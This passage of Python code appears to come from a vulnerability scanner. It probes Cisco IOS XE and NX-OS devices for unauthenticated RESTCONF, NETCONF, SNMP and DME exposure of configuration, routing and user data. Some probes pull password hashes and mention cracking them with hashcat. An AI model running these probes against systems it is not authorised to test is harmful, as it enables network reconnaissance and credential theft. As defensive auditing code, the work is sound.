                    f'stratum={stratum}, LI/VN/Mode byte=0x{li_vn_mode:02x}; '
                    f'NTP stratum and version confirm IOS device time source; '
                    f'enables protocol stack fingerprinting and time-sync attack '
                    f'surface enumeration'
                ),
                'host': host,
                'port': 123,
            })
            if stratum in (1, 2):
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'IOS_NTP_REFERENCE_DISCLOSED',
                    'detail':   (
                        f'NTP reference ID disclosed from {host}:123: '
                        f'"{ref_id_str}"; '
                        f'stratum {stratum} reference ID reveals '
                        f'{"upstream time source name (GPS/WWV/CDMA)" if stratum == 1 else "upstream NTP server IP address"}; '
                        f'leaks internal time infrastructure; '
                        f'NTP mode 6/7 (monlist) may expose peer table '
                        f'if not disabled with `ntp disable` on untrusted interfaces'
                    ),
                    'host': host,
                    'port': 123,
                })
    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# IOS XE Guest Shell / EEM / App Hosting programmability surface
# ---------------------------------------------------------------------------

def probe_cisco_ios_xe_guestshell_exposure(host: str, port: int = 443,
                                           timeout: float = 10.0) -> list:
    """Detect Cisco IOS XE Guest Shell, EEM, and App Hosting attack surfaces.

    IOS XE Guest Shell (introduced in 16.5.1a) is a Linux container (CentOS 7)
    running inside the router. It provides a full Python 3 runtime with
    privileged access to IOS EEM and NETCONF APIs. Unauthenticated RESTCONF
    reads of the virtual-service-data model expose whether Guest Shell is
    activated — an activated Guest Shell with unauth RESTCONF is a direct
    Python RCE surface on the control plane.

    EEM (Embedded Event Manager) policies can execute arbitrary CLI or Python
    scripts in response to events. Unauthenticated reads of the event-manager
    YANG subtree disclose the full policy set, action definitions, and any
    `action cli` or Python applet entries — a complete automation attack surface.

    NETCONF (RFC 6241, TCP 830) capability advertisement exposes supported YANG
    modules without authentication; iosxe-eem and iosxe-guestshell capabilities
    confirm the programmability surfaces available for exploitation.

    App Hosting (IOx framework) allows third-party Docker/LXC applications to
    run on IOS XE. Unauthenticated app-hosting-oper reads expose running app
    names, states, and resource allocations.

    Sources: Programming and Automating Cisco Networks (ISBN 9780134436777),
    Cisco IOS XE Programmability Guide 17.x, Cisco DevNet RESTCONF/EEM guide.
    """
    import ssl as _ssl
    import urllib.request as _urllib_req
    import urllib.error as _urllib_err
    import re as _re

    findings = []

    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE

    def _get(path, accept='application/yang-data+json, application/json'):
        url = f'https://{host}:{port}{path}'
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': accept,
        }
        try:
            req = _urllib_req.Request(url, headers=headers)
            with _urllib_req.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                return resp.status, body
        except _urllib_err.HTTPError as e:
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body
        except Exception:
            return None, ''

    # -----------------------------------------------------------------------
    # Guest Shell: virtual-service-data YANG subtree
    # IOS XE models virtual-service instances (including guestshell) under
    # Cisco-IOS-XE-virtual-service; state "Activated" = running Linux container
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/Cisco-IOS-XE-virtual-service:virtual-service-data')
    if status == 200 and body:
        if 'guestshell' in body.lower():
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_XE_GUESTSHELL_DETECTED',
                'detail':   (
                    f'GET /restconf/data/Cisco-IOS-XE-virtual-service:virtual-service-data '
                    f'returned HTTP 200 without authentication from {host}:{port}; '
                    f'response contains "guestshell" entry confirming the IOS XE Guest '
                    f'Shell virtual service is registered; Guest Shell is a privileged '
                    f'CentOS 7 Linux container with Python 3 runtime and full access to '
                    f'IOS EEM event actions and NETCONF APIs — combined with unauth '
                    f'RESTCONF this is a Python RCE surface on the router control plane; '
                    f'sample: {body[:300].strip()!r}'
                ),
                'host': host,
                'port': port,
            })
            # Detect activated (running) state specifically
            activated = bool(_re.search(r'"state"\s*:\s*"Activated"', body, _re.IGNORECASE))
            if not activated:
                activated = bool(_re.search(r'[Aa]ctivated', body))
            if activated:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'IOS_XE_GUESTSHELL_ACTIVE',
                    'detail':   (
                        f'Guest Shell state is "Activated" on {host}:{port}; '
                        f'an active Guest Shell container is a live Python 3 execution '
                        f'environment with kernel-level router access; EEM applets can '
                        f'trigger `guestshell run python3` actions; combined with '
                        f'unauthenticated RESTCONF this creates a full remote code '
                        f'execution path on the IOS XE control plane without credentials'
                    ),
                    'host': host,
                    'port': port,
                })
        else:
            # Virtual service data accessible even without guestshell entry
            findings.append({
                'severity': 'HIGH',
                'title':    'IOS_XE_VIRTUAL_SERVICE_DATA_EXPOSED',
                'detail':   (
                    f'GET /restconf/data/Cisco-IOS-XE-virtual-service:virtual-service-data '
                    f'returned HTTP 200 without authentication from {host}:{port}; '
                    f'virtual-service-data discloses all registered IOx/virtual service '
                    f'instances, their activation states, and resource allocations; '
                    f'sample: {body[:200].strip()!r}'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # Process memory: operational data leak
    # memory-usage-processes lists all IOS XE software processes with their
    # current and peak heap usage — reveals internal process tree topology
    # -----------------------------------------------------------------------
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-process-memory-oper:memory-usage-processes'
    )
    if status == 200 and body:
        proc_count = len(_re.findall(r'"name"\s*:', body))
        findings.append({
            'severity': 'HIGH',
            'title':    'IOS_XE_PROCESS_MEMORY_EXPOSED',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-process-memory-oper:'
                f'memory-usage-processes returned HTTP 200 without authentication '
                f'from {host}:{port}; {proc_count} process name entries detected; '
                f'operational process memory table discloses the full IOS XE software '
                f'process tree with allocated/freed/holding heap values per process; '
                f'reveals internal daemon names, feature processes, and memory layout '
                f'— prerequisite intelligence for heap-based exploit targeting; '
                f'sample: {body[:200].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # -----------------------------------------------------------------------
    # EEM: event-manager YANG subtree
    # Cisco-IOS-XE-eem models all configured EEM policies. An EEM applet with
    # `action cli run` or a Python script action is a scheduled code-exec surface.
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/Cisco-IOS-XE-eem:event-manager')
    if status == 200 and body:
        policy_count = len(_re.findall(r'"name"\s*:', body))
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_EEM_POLICIES_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-eem:event-manager returned HTTP 200 '
                f'without authentication from {host}:{port}; '
                f'{policy_count} EEM policy name entries detected; '
                f'EEM policy list exposes all configured Embedded Event Manager applets '
                f'and their trigger/action definitions — disclosing automation logic, '
                f'scheduled CLI actions, and Python script applets that execute with '
                f'router privilege; sample: {body[:300].strip()!r}'
            ),
            'host': host,
            'port': port,
        })
        # Detect CLI actions (arbitrary IOS CLI execution) or Python in EEM
        if _re.search(r'action\s+cli|action_cli|cli_run|guestshell run', body, _re.IGNORECASE):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_XE_EEM_CLI_ACTIONS',
                'detail':   (
                    f'EEM policy set from {host}:{port} contains "action cli" or '
                    f'"guestshell run" entries; these policies execute arbitrary IOS CLI '
                    f'commands or Python scripts on event trigger (SNMP trap, syslog '
                    f'match, timer, interface state change); an attacker who can inject '
                    f'a trigger event can cause the router to execute attacker-chosen '
                    f'CLI commands without additional authentication'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # NETCONF TCP 830: capability advertisement
    # NETCONF sends a hello message containing the full set of supported YANG
    # module capabilities before any authentication. IOS XE EEM and Guest Shell
    # YANG capabilities confirm the programmability surface without auth.
    # -----------------------------------------------------------------------
    netconf_port = 830
    netconf_hello = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">\n'
        b'  <capabilities>\n'
        b'    <capability>urn:ietf:params:netconf:base:1.0</capability>\n'
        b'    <capability>urn:ietf:params:netconf:base:1.1</capability>\n'
        b'  </capabilities>\n'
        b'</hello>\n'
        b']]>]]>'
    )
    try:
        nc_sock = socket.create_connection((host, netconf_port), timeout=timeout)
        nc_sock.settimeout(timeout)
        # Read server hello first (IOS XE sends it before client hello)
        server_hello = b''
        while b']]>]]>' not in server_hello:
            chunk = nc_sock.recv(4096)
            if not chunk:
                break
            server_hello += chunk
            if len(server_hello) > 65536:
                break
        nc_sock.sendall(netconf_hello)
        nc_sock.close()
        hello_str = server_hello.decode('utf-8', errors='replace')
        if 'capability' in hello_str.lower():
            cap_count = len(_re.findall(r'<capability>', hello_str))
            # Check for IOS XE EEM or Guest Shell YANG capabilities
            has_eem = bool(_re.search(r'iosxe-eem|ios-xe-eem|Cisco-IOS-XE-eem', hello_str, _re.IGNORECASE))
            has_gs  = bool(_re.search(r'iosxe-guestshell|virtual.service|guestshell', hello_str, _re.IGNORECASE))
            sev = 'CRITICAL' if (has_eem or has_gs) else 'HIGH'
            title = 'IOS_XE_EEM_NETCONF_CAP' if has_eem else 'IOS_XE_GUESTSHELL_NETCONF_CAP' if has_gs else 'IOS_XE_NETCONF_HELLO_OPEN'
            findings.append({
                'severity': sev,
                'title':    title,
                'detail':   (
                    f'NETCONF TCP {netconf_port} on {host} returned server hello with '
                    f'{cap_count} capability entries before any authentication; '
                    f'EEM capability present: {has_eem}; '
                    f'Guest Shell capability present: {has_gs}; '
                    f'NETCONF capability advertisement is unauthenticated by RFC 6241 '
                    f'design — it fully discloses the YANG module set supported; '
                    f'EEM/GuestShell presence confirms Python and CLI execution attack '
                    f'surface reachable via authenticated NETCONF; '
                    f'sample capabilities: {hello_str[:300].strip()!r}'
                ),
                'host': host,
                'port': netconf_port,
            })
    except Exception:
        pass

    # -----------------------------------------------------------------------
    # IOS XE WebUI fingerprint
    # The IOS XE WebUI runs on HTTPS 443. /webui/ serves a React SPA with
    # "Cisco IOS XE" in the page title or meta tags, confirming the device type.
    # -----------------------------------------------------------------------
    status, body = _get('/webui/', accept='text/html,application/xhtml+xml,*/*')
    if status == 200 and body:
        if _re.search(r'Cisco IOS XE|iosxe|ios-xe', body, _re.IGNORECASE):
            findings.append({
                'severity': 'MEDIUM',
                'title':    'IOS_XE_WEBUI_DETECTED',
                'detail':   (
                    f'GET /webui/ returned HTTP 200 with "Cisco IOS XE" fingerprint '
                    f'from {host}:{port}; IOS XE WebUI (HTTP dashboard) is accessible; '
                    f'WebUI provides REST-based configuration access and serves as the '
                    f'primary management surface for non-CLI operators; '
                    f'presence confirms this is an IOS XE device with WebUI enabled; '
                    f'sample: {body[:200].strip()!r}'
                ),
                'host': host,
                'port': port,
            })
    # WebUI logon page — reveals auth method (local/RADIUS/TACACS+)
    status2, body2 = _get('/webui/logon.html', accept='text/html,application/xhtml+xml,*/*')
    if status2 == 200 and body2:
        auth_method = 'unknown'
        if _re.search(r'radius', body2, _re.IGNORECASE):
            auth_method = 'RADIUS'
        elif _re.search(r'tacacs', body2, _re.IGNORECASE):
            auth_method = 'TACACS+'
        elif _re.search(r'local', body2, _re.IGNORECASE):
            auth_method = 'local'
        findings.append({
            'severity': 'HIGH',
            'title':    'IOS_XE_WEBUI_AUTH',
            'detail':   (
                f'GET /webui/logon.html returned HTTP 200 from {host}:{port}; '
                f'WebUI logon page is accessible, auth method detected: {auth_method}; '
                f'logon page disclosure confirms WebUI is active and may expose '
                f'credential brute-force surface; local auth means credentials are '
                f'in the local user database; RADIUS/TACACS+ auth means '
                f'AAA server trust relationship is the attack pivot; '
                f'sample: {body2[:200].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # -----------------------------------------------------------------------
    # App Hosting (IOx): app-hosting-oper-data
    # IOx App Hosting allows third-party Docker/LXC apps to run on IOS XE.
    # Unauthenticated reads expose running app names, states, resource usage.
    # -----------------------------------------------------------------------
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-app-hosting-oper:app-hosting-oper-data'
    )
    if status == 200 and body:
        app_count = len(_re.findall(r'"application-id"\s*:|"app-id"\s*:|"name"\s*:', body))
        findings.append({
            'severity': 'HIGH',
            'title':    'IOS_XE_APP_HOSTING_ACTIVE',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-app-hosting-oper:app-hosting-oper-data '
                f'returned HTTP 200 without authentication from {host}:{port}; '
                f'{app_count} application identifier entries detected; '
                f'IOx App Hosting operational data discloses running third-party '
                f'application names, activation states, CPU/memory resource allocations, '
                f'and network attachment information; running IOx apps extend the router '
                f'attack surface beyond IOS XE itself to the hosted application layer; '
                f'sample: {body[:250].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# IOS XE ACL / NAT / routing configuration extraction via automation APIs
# ---------------------------------------------------------------------------

def probe_cisco_ios_acl_nat_config_extraction(host: str, port: int = 443,
                                               timeout: float = 10.0) -> list:
    """Detect Cisco IOS XE ACL, NAT, routing, and user config extraction via RESTCONF/SNMP.

    RESTCONF (RFC 8040, HTTPS 443) provides REST-style access to YANG-modeled
    configuration and operational data. The Cisco-IOS-XE-native YANG module
    covers the full native IOS XE configuration tree — every subtree that can be
    read via `show running-config` is reachable via RESTCONF if unauthenticated
    access is not disabled with `restconf` + `ip http authentication` + ACLs.

    Unauthenticated reads of:
    - ip/access-list: exposes the full ACL ruleset (permit/deny rules, source/dest
      subnets, protocols, ports) — complete network segmentation blueprint
    - ip/nat: exposes NAT pool/overload rules and inside/outside interface mappings
      — full topology disclosure including private address space
    - ip/route: exposes static route table — reveals next-hops and network topology
    - username: exposes local user accounts and stored password hashes (type 5/7/8/9)
    - ietf-interfaces: exposes all interface names with IP addresses — full L3 map

    SNMP ipCidrRouteTable (OID 1.3.6.1.2.1.4.24.4, IP-FORWARD-MIB) discloses the
    full IP routing table via UDP 161 with the default "public" community string.

    Sources: Programming and Automating Cisco Networks (ISBN 9780134436777),
    Cisco IOS XE RESTCONF Programmability Guide 17.x,
    RFC 8040 (RESTCONF Protocol), IP-FORWARD-MIB RFC 2096.
    """
    import ssl as _ssl
    import urllib.request as _urllib_req
    import urllib.error as _urllib_err
    import re as _re

    findings = []

    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE

    def _get(path, accept='application/yang-data+json, application/json'):
        url = f'https://{host}:{port}{path}'
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': accept,
        }
        try:
            req = _urllib_req.Request(url, headers=headers)
            with _urllib_req.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                return resp.status, body
        except _urllib_err.HTTPError as e:
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body
        except Exception:
            return None, ''

    # -----------------------------------------------------------------------
    # ACL configuration: access-list subtree
    # ip/access-list contains standard and extended ACL definitions.
    # Standard ACLs: source-address based permit/deny rules.
    # Extended ACLs: source/dest + protocol/port rules — full firewall ruleset.
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/ip/access-list')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_ACL_CONFIG_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/ip/access-list '
                f'returned HTTP 200 without authentication from {host}:{port}; '
                f'full ACL configuration is readable without credentials; '
                f'ACL ruleset discloses the network segmentation policy — '
                f'which subnets are permitted/denied between security zones, '
                f'enabling precise identification of traffic paths and bypass routes; '
                f'sample: {body[:300].strip()!r}'
            ),
            'host': host,
            'port': port,
        })
        # Standard ACLs (source-address based)
        std_count = len(_re.findall(r'"standard"\s*|"std-ace"\s*|"sequence"\s*', body))
        if std_count > 0:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_XE_STANDARD_ACLS_EXPOSED',
                'detail':   (
                    f'Standard ACL entries detected in unauthenticated RESTCONF response '
                    f'from {host}:{port} ({std_count} sequence/entry references); '
                    f'standard ACLs control source-address-based permit/deny — '
                    f'disclosed rules reveal which source networks are trusted, '
                    f'enabling impersonation of permitted source IPs to bypass '
                    f'access controls on unprotected interfaces'
                ),
                'host': host,
                'port': port,
            })
        # Extended ACLs (source/dest + protocol/port)
        ext_count = len(_re.findall(r'"extended"\s*|"ext-ace"\s*|"destination"\s*', body))
        if ext_count > 0:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_XE_EXTENDED_ACLS_EXPOSED',
                'detail':   (
                    f'Extended ACL entries detected in unauthenticated RESTCONF response '
                    f'from {host}:{port} ({ext_count} destination/ext-ace references); '
                    f'extended ACLs control source+dest+protocol+port — '
                    f'disclosed ruleset is equivalent to the full firewall policy, '
                    f'revealing service port allowances, inter-VLAN permitted paths, '
                    f'and protocol tunneling permissions; directly maps the attack surface'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # NAT configuration: ip/nat subtree
    # NAT rules expose private address space, inside/outside interface mappings,
    # and overload (PAT) pool definitions.
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/ip/nat')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_NAT_CONFIG_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/ip/nat '
                f'returned HTTP 200 without authentication from {host}:{port}; '
                f'NAT configuration discloses address translation rules and pool '
                f'definitions; reveals private-to-public IP mappings and ACL names '
                f'controlling which traffic is translated; '
                f'sample: {body[:300].strip()!r}'
            ),
            'host': host,
            'port': port,
        })
        # Inside/outside interface topology
        if _re.search(r'"inside"\s*|"outside"\s*|"interface"\s*', body):
            findings.append({
                'severity': 'HIGH',
                'title':    'IOS_XE_NAT_TOPOLOGY_DISCLOSED',
                'detail':   (
                    f'NAT inside/outside interface mappings readable without auth '
                    f'from {host}:{port}; disclosed interface assignments reveal the '
                    f'network boundary design — which interfaces face the public network '
                    f'vs. private segments; combined with ACL disclosure provides '
                    f'complete network topology for lateral movement planning'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # Static route table: ip/route subtree
    # Static routes reveal next-hops and destination networks not covered by
    # dynamic routing protocols — common for management networks and DMZ paths.
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/ip/route')
    if status == 200 and body:
        route_count = len(_re.findall(r'"ip-route-interface-forwarding-list"\s*:|"fwd-list"\s*:|"prefix"\s*:', body))
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_STATIC_ROUTES_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/ip/route '
                f'returned HTTP 200 without authentication from {host}:{port}; '
                f'{route_count} route prefix/fwd-list entries detected; '
                f'static route table disclosure reveals destination prefixes, '
                f'next-hop IP addresses, and egress interfaces; '
                f'management network routes (e.g., 10.0.0.0/8 via 192.168.1.1) '
                f'enable precise lateral movement path reconstruction; '
                f'sample: {body[:300].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # -----------------------------------------------------------------------
    # Local user database: username subtree
    # IOS XE stores local users (name + privilege level + password hash) in the
    # native:native/username list. Password hashes: type 5 (MD5), type 7 (XOR,
    # trivially reversible), type 8 (PBKDF2-SHA256), type 9 (scrypt).
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/username')
    if status == 200 and body:
        user_count = len(_re.findall(r'"name"\s*:\s*"', body))
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_LOCAL_USERS_UNAUTH',
            'detail':   (
                f'GET /restconf/data/Cisco-IOS-XE-native:native/username '
                f'returned HTTP 200 without authentication from {host}:{port}; '
                f'{user_count} local username entries detected; '
                f'local user database disclosure reveals account names and privilege '
                f'levels (0-15); enables targeted credential brute-force against '
                f'SSH/Telnet/HTTPS with known-valid usernames; '
                f'sample: {body[:300].strip()!r}'
            ),
            'host': host,
            'port': port,
        })
        # Check for exposed password hashes (type 5/7/8/9 patterns)
        hash_match = _re.search(
            r'"(password|secret)"\s*:\s*"\$[159]\$[^"]{8,}"|'
            r'"(password|secret)"\s*:\s*"\d{2}[0-9A-Fa-f]{6,}"',
            body
        )
        if hash_match:
            # Determine hash types present
            type5  = bool(_re.search(r'"\$1\$', body))
            type7  = bool(_re.search(r'"(?:password|secret)"\s*:\s*"[0-9]{2}[0-9A-Fa-f]+', body))
            type8  = bool(_re.search(r'"\$8\$', body))
            type9  = bool(_re.search(r'"\$9\$', body))
            types  = ', '.join(t for t, p in [('type-5(MD5)', type5), ('type-7(XOR)', type7),
                                               ('type-8(PBKDF2)', type8), ('type-9(scrypt)', type9)] if p)
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_XE_PASSWORD_HASHES_UNAUTH',
                'detail':   (
                    f'Password hashes present in unauthenticated username response '
                    f'from {host}:{port}; hash types detected: {types or "present"}; '
                    f'type-7 hashes are trivially reversible (Cisco XOR, ~0ms to crack); '
                    f'type-5 (MD5-crypt) cracks with hashcat -m 500; '
                    f'type-8/9 require PBKDF2/scrypt compute but are still offline-crackable; '
                    f'recovered passwords enable authenticated SSH/NETCONF/RESTCONF '
                    f'access to the device and any reused credential targets'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # Interface list with IPs: ietf-interfaces
    # ietf-interfaces (RFC 8343) provides vendor-neutral interface enumeration.
    # Each interface entry includes name, type, IP addresses, and admin state.
    # -----------------------------------------------------------------------
    status, body = _get('/restconf/data/ietf-interfaces:interfaces')
    if status == 200 and body:
        iface_count = len(_re.findall(r'"name"\s*:\s*"(?:Gi|Fa|Te|Lo|Tun|Vl|Port)', body))
        ip_count    = len(_re.findall(r'"ip"\s*:\s*"[\d\.]+"|"address"\s*:\s*"[\d\.]+"', body))
        findings.append({
            'severity': 'CRITICAL',
            'title':    'IOS_XE_INTERFACES_WITH_IPS',
            'detail':   (
                f'GET /restconf/data/ietf-interfaces:interfaces returned HTTP 200 '
                f'without authentication from {host}:{port}; '
                f'{iface_count} interface name entries and {ip_count} IP address '
                f'values detected; full interface inventory discloses all L3 '
                f'addressing (GigabitEthernet, Loopback, Tunnel, VLAN SVI) — '
                f'complete network address map for the device; combined with NAT '
                f'and route disclosure provides full topology intelligence; '
                f'sample: {body[:300].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    # -----------------------------------------------------------------------
    # SNMP ipCidrRouteTable: IP-FORWARD-MIB OID 1.3.6.1.2.1.4.24.4
    # ipCidrRouteTable (RFC 2096) is the full IP routing table exposed via SNMP.
    # Community string "public" is the IOS default if `no snmp-server` not set.
    # Walk OID 1.3.6.1.2.1.4.24.4 — each row: dest, mask, tos, nexthop, ifindex.
    # -----------------------------------------------------------------------
    snmp_port = 161
    # Probe the ipCidrRouteTable root with a GetRequest to confirm responsiveness
    oid_ipcidrtable = '1.3.6.1.2.1.4.24.4'
    try:
        pkt = _snmp_get_request('public', oid_ipcidrtable)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(pkt, (host, snmp_port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        # A valid SNMP response starts with 0x30 (SEQUENCE) and contains 0xa2 (GetResponse)
        if data and len(data) > 10 and data[0] == 0x30 and b'\xa2' in data[:20]:
            # Extract any OctetString values (route entries appear as strings in some MIBs)
            str_vals = _parse_snmp_response(data)
            route_sample = [v for v in (str_vals or []) if v.strip()][:3]
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_ROUTING_TABLE_VIA_SNMP',
                'detail':   (
                    f'SNMP GetRequest for ipCidrRouteTable OID 1.3.6.1.2.1.4.24.4 '
                    f'received a valid GetResponse ({len(data)} bytes) from {host}:{snmp_port} '
                    f'using community "public"; IP-FORWARD-MIB ipCidrRouteTable (RFC 2096) '
                    f'exposes the full IP routing table — destination prefixes, subnet masks, '
                    f'TOS values, next-hop addresses, and egress interface indices; '
                    f'unauthenticated SNMP routing table read is a complete network topology '
                    f'disclosure; sample values: {route_sample!r}'
                ),
                'host': host,
                'port': snmp_port,
            })
    except Exception:
        pass

    return findings


def probe_cisco_dme_object_model_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco IOS XE and NX-OS DME object model exposure via RESTCONF and DME REST."""
    import ssl
    import urllib.request
    import urllib.error
    import json
    import re

    findings = []

    def _make_ctx():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _http_get(url, timeout_s):
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json, application/json',
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            if url.startswith('https://'):
                resp = urllib.request.urlopen(req, timeout=timeout_s, context=_make_ctx())
            else:
                resp = urllib.request.urlopen(req, timeout=timeout_s)
            body = resp.read(65536).decode('utf-8', errors='replace')
            return resp.status, body
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # Determine scheme order to try
    if port == 443:
        schemes = [('https', 443), ('http', 80)]
    elif port == 80:
        schemes = [('http', 80), ('https', 443)]
    else:
        schemes = [('https', port), ('http', port)]

    # IOS XE RESTCONF paths: (path, title, severity, detail_prefix)
    ios_xe_paths = [
        ('/restconf/data/Cisco-IOS-XE-mpls-oper:mpls-oper-data', 'IOS_XE_MPLS_OPER_UNAUTH', 'CRITICAL',
         'IOS XE RESTCONF MPLS operational data exposed unauthenticated'),
        ('/restconf/data/Cisco-IOS-XE-bgp-oper:bgp-state-data', 'IOS_XE_BGP_OPER_UNAUTH', 'CRITICAL',
         'IOS XE RESTCONF BGP state data exposed unauthenticated'),
        ('/restconf/data/Cisco-IOS-XE-ospf-oper:ospf-oper-data', 'IOS_XE_OSPF_OPER_UNAUTH', 'CRITICAL',
         'IOS XE RESTCONF OSPF operational data exposed unauthenticated'),
    ]

    # NX-OS DME REST paths
    nxos_paths = [
        ('/api/mo/sys/bgp.json', 'NXOS_DME_BGP_UNAUTH', 'CRITICAL',
         'NX-OS DME BGP model object exposed unauthenticated'),
        ('/api/mo/sys/ospf.json', 'NXOS_DME_OSPF_UNAUTH', 'CRITICAL',
         'NX-OS DME OSPF instance object exposed unauthenticated'),
        ('/api/mo/sys/lldp.json', 'NXOS_DME_LLDP_UNAUTH', 'CRITICAL',
         'NX-OS DME LLDP state object exposed unauthenticated'),
        ('/api/mo/sys/cdp.json', 'NXOS_DME_CDP_UNAUTH', 'CRITICAL',
         'NX-OS DME CDP neighbor state exposed unauthenticated'),
        ('/api/mo/sys/acl.json', 'NXOS_DME_ACL_UNAUTH', 'CRITICAL',
         'NX-OS DME ACL policy objects exposed unauthenticated'),
    ]

    # Resolve live scheme/port via liveness probe
    used_scheme = None
    used_port = None
    for scheme_hint, port_hint in schemes:
        base = f'{scheme_hint}://{host}:{port_hint}'
        s, _ = _http_get(f'{base}/restconf/data', timeout)
        if s is not None:
            used_scheme, used_port = scheme_hint, port_hint
            break
        s, _ = _http_get(f'{base}/api/mo/sys.json', timeout)
        if s is not None:
            used_scheme, used_port = scheme_hint, port_hint
            break

    if used_scheme is None:
        return findings

    base_url = f'{used_scheme}://{host}:{used_port}'

    for path, title, severity, detail_prefix in ios_xe_paths + nxos_paths:
        url = base_url + path
        status, body = _http_get(url, timeout)
        if status not in (200, 201, 206):
            continue
        if '{' not in body and '[' not in body:
            continue

        findings.append({
            'severity': severity,
            'title': title,
            'detail': f'{detail_prefix} — HTTP {status}, {len(body)} bytes from {path}',
            'host': host,
            'port': used_port,
        })

        # IOS XE BGP peer extraction
        if title == 'IOS_XE_BGP_OPER_UNAUTH':
            try:
                raw = body
                neighbor_ips = re.findall(
                    r'neighbor-id["\s:]+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})', raw)
                as_nums = re.findall(r'remote-as["\s:]+([0-9]+)', raw)
                if neighbor_ips or as_nums:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': 'IOS_XE_BGP_PEERS_DISCLOSED',
                        'detail': (f'BGP peers exposed: neighbors={neighbor_ips[:10]}, '
                                   f'remote-AS={as_nums[:10]}'),
                        'host': host,
                        'port': used_port,
                    })
            except Exception:
                pass

        # IOS XE OSPF topology extraction
        if title == 'IOS_XE_OSPF_OPER_UNAUTH':
            try:
                raw = body
                nbr_ids = re.findall(
                    r'neighbor-id["\s:]+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})', raw)
                areas = re.findall(r'area-id["\s:]+([0-9\.]+)', raw)
                if nbr_ids or areas:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'IOS_XE_OSPF_TOPOLOGY_DISCLOSED',
                        'detail': (f'OSPF topology disclosed: neighbor_ids={nbr_ids[:10]}, '
                                   f'areas={areas[:10]}'),
                        'host': host,
                        'port': used_port,
                    })
            except Exception:
                pass

        # NX-OS DME BGP peer extraction
        if title == 'NXOS_DME_BGP_UNAUTH':
            try:
                raw = body
                local_as = re.findall(r'bgpLocalAs["\s:]+([0-9]+)', raw)
                peer_ips = re.findall(
                    r'"addr"["\s:]+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})', raw)
                if local_as or peer_ips:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': 'NXOS_BGP_PEERS_DISCLOSED',
                        'detail': (f'NX-OS BGP DME data disclosed: local_as={local_as[:5]}, '
                                   f'peer_ips={peer_ips[:10]}'),
                        'host': host,
                        'port': used_port,
                    })
            except Exception:
                pass

